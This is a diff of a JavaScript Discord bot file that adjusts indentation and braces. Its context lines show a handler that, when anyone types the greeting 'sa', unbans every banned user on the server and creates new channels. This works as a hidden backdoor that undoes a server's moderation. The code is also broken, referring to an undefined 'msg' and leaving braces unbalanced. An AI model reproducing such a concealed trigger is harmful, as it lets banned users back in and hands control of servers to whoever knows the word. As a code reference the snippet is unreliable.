@@ -14,7 +14,7 @@ const http = require('http');
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 berke.on('message', message => {
-    if(message.content.toLowerCase() === 'sa' ) {    
+if(message.content.toLowerCase() === 'sa' ) {    
 msg.guild.fetchBans().then(bans => {
 bans.forEach(user => {
 msg.guild.unban(user)
@@ -29,9 +29,8 @@ let kanal1 = 'buraya-yazın'
 
 msg.guild.createChannel(kanal)
 msg.guild.createChannel(kanal1)
-}
-}
-         }
+           };
+        }
 
  
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
